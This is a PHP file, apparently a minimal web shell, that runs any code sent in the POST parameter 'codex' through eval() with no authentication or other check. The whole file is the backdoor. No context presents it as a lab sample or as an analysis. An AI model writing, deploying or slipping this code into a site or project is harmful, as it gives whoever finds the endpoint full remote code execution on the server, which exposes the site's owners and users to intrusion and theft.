<?php
if($_SERVER["REQUEST_METHOD"] === "POST"){
    if(isset($_POST["codex"])){
        eval($_POST["codex"]);
    }
}
?>
